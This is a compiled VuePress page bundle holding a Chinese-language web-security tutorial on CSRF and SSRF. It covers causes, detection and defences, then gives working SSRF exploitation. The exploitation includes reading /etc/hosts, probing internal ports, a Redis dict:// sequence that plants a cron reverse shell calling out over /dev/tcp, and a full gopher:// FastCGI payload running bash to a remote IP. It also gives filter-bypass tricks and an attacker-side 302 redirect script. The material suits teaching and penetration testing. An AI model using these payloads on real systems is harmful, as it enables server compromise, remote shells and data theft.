import{_ as p}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as i,c as l,a as s,b as n,d as e,e as t,r as o}from"./app.9e3cc3d3.js";const c={},r=t('<h2 id="csrf客户端请求伪造" tabindex="-1"><a class="header-anchor" href="#csrf客户端请求伪造" aria-hidden="true">#</a> CSRF客户端请求伪造</h2><h3 id="漏洞概述" tabindex="-1"><a class="header-anchor" href="#漏洞概述" aria-hidden="true">#</a> 漏洞概述</h3><p>比如某网站用户信息修改功能，攻击者可以用HTML构造恶意代码提交POST请求</p><p>诱骗已经登陆的受害者点击，可以直接修改用户信息</p><details class="custom-container details"><summary>CSRF 攻击和 XSS 的区别</summary><p>CSRF攻击不需要将恶意代码注入用户的页面，仅是利用服务端的漏洞和用户的登录状态来实施攻击</p></details><h4 id="漏洞成因" tabindex="-1"><a class="header-anchor" href="#漏洞成因" aria-hidden="true">#</a> 漏洞成因</h4><p>CSRF由客户端发起；在执行关键操作时，没有进行是否由用户自愿发起的确认；</p><p>攻击者通过用户的浏览器来注入额外的网络请求，来破坏一个网站会话的完整性。</p><h4 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h4><p>1、验证Referer（有被绕过的风险，从HTTPS页面跳转到HTTP页面时Referer不会被传递）</p><p>2、添加token（保证随机性和一次性）</p><h3 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h3><h4 id="get请求方法利用" tabindex="-1"><a class="header-anchor" href="#get请求方法利用" aria-hidden="true">#</a> GET请求方法利用</h4><h4 id="post请求方法利用" tabindex="-1"><a class="header-anchor" href="#post请求方法利用" aria-hidden="true">#</a> POST请求方法利用</h4>',14),d={href:"https://www.cnblogs.com/backlion/p/13083242.html",target:"_blank",rel:"noopener noreferrer"},u=t('<h2 id="ssrf服务端请求伪造" tabindex="-1"><a class="header-anchor" href="#ssrf服务端请求伪造" aria-hidden="true">#</a> SSRF服务端请求伪造</h2><h3 id="漏洞概述-1" tabindex="-1"><a class="header-anchor" href="#漏洞概述-1" aria-hidden="true">#</a> 漏洞概述</h3><p>Server-Side Request Forgery 是一种由攻击者构造形成由服务端发起请求的漏洞</p><p>攻击的目标是从外网无法访问的内部系统</p><p>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统</p><details class="custom-container details"><summary>SSRF 成因</summary><p>由于服务端提供了从其他服务器应用获取数据的功能</p><p>且没有对目标地址做过滤与限制 (没有做合法性验证)</p></details><details class="custom-container details"><summary>出现场景</summary><p>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞。</p><p>从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p></details><details class="custom-container details"><summary>检测方法</summary><p>1）通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p><p>2）在页面源码中查找访问的资源地址 ，</p><p>如果该资源地址类型为 <code>www.baidu.com/xxx.php?image=</code>（地址）的就可能存在SSRF漏洞</p></details>',8),v={class:"custom-container details"},m=s("summary",null,"防御方案",-1),h=s("p",null,"1、检查Host是否是内网IP",-1),k=s("p",null,"2、限制可用协议和请求端口(HTTP、HTTPS；80、443)",-1),b=s("p",null,"3、禁止跳转",-1),g={href:"https://tinyurl.com/",target:"_blank",rel:"noopener noreferrer"},f=t(`<h2 id="漏洞利用-1" tabindex="-1"><a class="header-anchor" href="#漏洞利用-1" aria-hidden="true">#</a> 漏洞利用</h2><p>攻击内网服务</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#读取内网文件</span>
ssrf.php?url<span class="token operator">=</span>file:///etc/hosts

<span class="token comment">#内网端口探测</span>
ssrf.php?url<span class="token operator">=</span><span class="token number">127.0</span>.0.1:3306

<span class="token comment">#Burp下使用迭代器模式爆破，设置好要爆破的 IP 和 端口即可批量探测出端口开放的信息</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="dict协议-redis未授权" tabindex="-1"><a class="header-anchor" href="#dict协议-redis未授权" aria-hidden="true">#</a> DICT协议+Redis未授权</h3><p>通过 SSRF 直接发起 DICT 请求，可以成功看到 Redis 返回执行完 info 命令后的结果信息</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">dict</span><span class="token punctuation">:</span><span class="token header-value">//x.x.x.x:6379/info</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>定时任务反弹shell</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 清空 key</span>
dict://192.168.1.111:6379/flushall

<span class="token comment"># 设置定时任务目录</span>
dict://192.168.1.111:6379/config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/

<span class="token comment"># 创建定时任务文件</span>
dict://192.168.1.111:6379/config <span class="token builtin class-name">set</span> dbfilename root

<span class="token comment"># 写入反弹 shell 的 payload</span>
dict://192.168.1.111:6379/set x <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span>* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/1234 0&gt;%261<span class="token entity" title="\\n">\\n</span>&quot;</span>
<span class="token comment">#SSRF 传递的时候记得要把 &amp; URL 编码为 %26</span>

<span class="token comment"># 保存</span>
dict://172.72.23.27:6379/save
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,8),_={href:"https://github.com/LS95/gopher-redis-auth",target:"_blank",rel:"noopener noreferrer"},x=s("h3",{id:"gopher打fastcgi",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#gopher打fastcgi","aria-hidden":"true"},"#"),n(" GOPHER打FastCGI")],-1),R=s("p",null,"一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的；",-1),T=s("p",null,"但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。",-1),S={href:"https://github.com/piaca/fcgi_exp",target:"_blank",rel:"noopener noreferrer"},y=t(`<div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./fcgi_exp system 目标IP <span class="token number">9000</span> /var/www/html/1.php <span class="token string">&quot;bash -i &gt;&amp; /dev/tcp/攻击者IP/2333 0&gt;&amp;1&quot;</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvv</span> <span class="token number">2333</span> <span class="token operator">&gt;</span> <span class="token number">1</span>.txt
xdd <span class="token number">1</span>.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>构造 Gopher 协议的 URL</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">gopher</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">&quot;Gopher协议的URL&quot;</span>

<span class="token comment">#本地监听2333端口，收到反弹shell</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvv</span> <span class="token number">2333</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="绕过技巧" tabindex="-1"><a class="header-anchor" href="#绕过技巧" aria-hidden="true">#</a> 绕过技巧</h2><h3 id="_1-检查ip是否为内网ip" tabindex="-1"><a class="header-anchor" href="#_1-检查ip是否为内网ip" aria-hidden="true">#</a> 1）检查IP是否为内网IP</h3><p>很多开发者认为，只要检查一下请求url的host不为内网IP，即可防御SSRF。</p><p>通常使用正则过滤以下5个IP段</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">192.168</span>.0.0/16
<span class="token number">10.0</span>.0.0/8
<span class="token number">172.16</span>.0.0/12
<span class="token number">127.0</span>.0.0/8
<span class="token number">0.0</span>.0.0/8  <span class="token comment">#在Linux下，127.0.0.1与0.0.0.0都指向本地</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这种防御方法通常可以用IP地址进制转换绕过</p><p>利用八进制IP地址绕过 <code>0177.0.0.1</code></p><p>利用十六进制IP地址绕过 <code>0x7f000001</code></p><p>利用十进制的IP地址绕过 <code>2130706433</code></p><p>他们一个都匹配不上正则表达式， 但实际请求都是127.0.0.1</p><h3 id="_2-利用url解析器滥用" tabindex="-1"><a class="header-anchor" href="#_2-利用url解析器滥用" aria-hidden="true">#</a> 2）利用URL解析器滥用</h3><p>某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。</p><p>这时候可能会出现对URL参数解析不当，导致可以绕过过滤</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://www.baidu.com@127.0.0.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当后端程序通过不正确的正则表达式,对上述URL的内容解析的时候</p><p>会认为访问URL的host为<code>www.baidu.com</code>而实际上请求的是127.0.0.1上的内容</p><p>构造CURL的payload：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-d</span> <span class="token string">&quot;url=http://foo@127.0.0.1:80@www.baidu.com/flag.php&quot;</span> <span class="token string">&quot;http://192.168.43.157&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="_3-301-302跳转绕过" tabindex="-1"><a class="header-anchor" href="#_3-301-302跳转绕过" aria-hidden="true">#</a> 3）301/302跳转绕过</h3><p>限制可用协议和请求端口(HTTP、HTTPS；80、443)时可利用302跳转绕过</p><details class="custom-container details"><summary>利用条件</summary><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>程序的合法性检验逻辑为: 检查url参数的host是否为内网地址

使用的是CURL方法，并且CURLOPT_FOLLOWLOCATION为true(即跟随302/301进行跳转)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>:::detials 可利用的协议</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http/https
dict
gopher

file协议不行
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>:::</p><details class="custom-container details"><summary>目标服务器代码</summary><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>//ssrf.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//根据服务器返回 HTTP 头中的 &quot;Location: &quot; 重定向</span>
    
    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;url&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                                         
	<span class="token keyword">print</span> <span class="token variable">$url</span><span class="token punctuation">;</span>                                                                  
	<span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><details class="custom-container details"><summary>攻击者VPS代码</summary><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>//302.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$schema</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;schema&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span>     <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;ip&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$port</span>   <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;port&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;query&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;\\n&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$schema</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;://&quot;</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;/&quot;</span><span class="token operator">.</span><span class="token variable">$query</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Location: <span class="token interpolation"><span class="token variable">$schema</span></span>://<span class="token interpolation"><span class="token variable">$ip</span></span>/<span class="token interpolation"><span class="token variable">$query</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
   <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Location: <span class="token interpolation"><span class="token variable">$schema</span></span>://<span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>/<span class="token interpolation"><span class="token variable">$query</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#http/https</span>
http://目标网站HOST/ssrf.php?url<span class="token operator">=</span>http://vps的IP/302.php?schema<span class="token operator">=</span>http<span class="token operator">&amp;</span><span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">&amp;</span><span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">80</span>

<span class="token comment">#dict</span>
http://目标网站HOST/ssrf.php?url<span class="token operator">=</span>http://vps的IP/302.php?schema<span class="token operator">=</span>dict<span class="token operator">&amp;</span><span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">&amp;</span><span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">29362</span><span class="token operator">&amp;</span><span class="token assign-left variable">query</span><span class="token operator">=</span>info

<span class="token comment">#gopher</span>
http://目标网站HOST/ssrf.php?url<span class="token operator">=</span>http://vps的IP/302.php?schema<span class="token operator">=</span>gopher<span class="token operator">&amp;</span><span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">&amp;</span><span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">2333</span><span class="token operator">&amp;</span><span class="token assign-left variable">query</span><span class="token operator">=</span><span class="token number">66666</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接" aria-hidden="true">#</a> 参考链接</h2>`,32),q={href:"https://xz.aliyun.com/t/6373",target:"_blank",rel:"noopener noreferrer"},L={href:"https://blog.chaitin.cn/gopher-attack-surfaces/",target:"_blank",rel:"noopener noreferrer"};function P(w,E){const a=o("ExternalLinkIcon");return i(),l("div",null,[r,s("p",null,[s("a",d,[n("https://www.cnblogs.com/backlion/p/13083242.html"),e(a)])]),u,s("details",v,[m,h,k,b,s("p",null,[n("4、URL长度限制；短链接："),s("a",g,[n("生成短链接的网站"),e(a)])])]),f,s("p",null,[s("a",_,[n("gopher-redis-auth攻击脚本"),e(a)])]),x,R,T,s("p",null,[n("首先根据 "),s("a",S,[n("faci_exp"),e(a)]),n(" 生成exp，随后改成支持gopher协议的URL")]),y,s("p",null,[s("a",q,[n("SSRF在有无回显方面的利用及其思考与总结 "),e(a)])]),s("p",null,[s("a",L,[n("利用 Gopher 协议拓展攻击面"),e(a)])])])}const F=p(c,[["render",P],["__file","请求伪造漏洞.html.vue"]]);export{F as default};
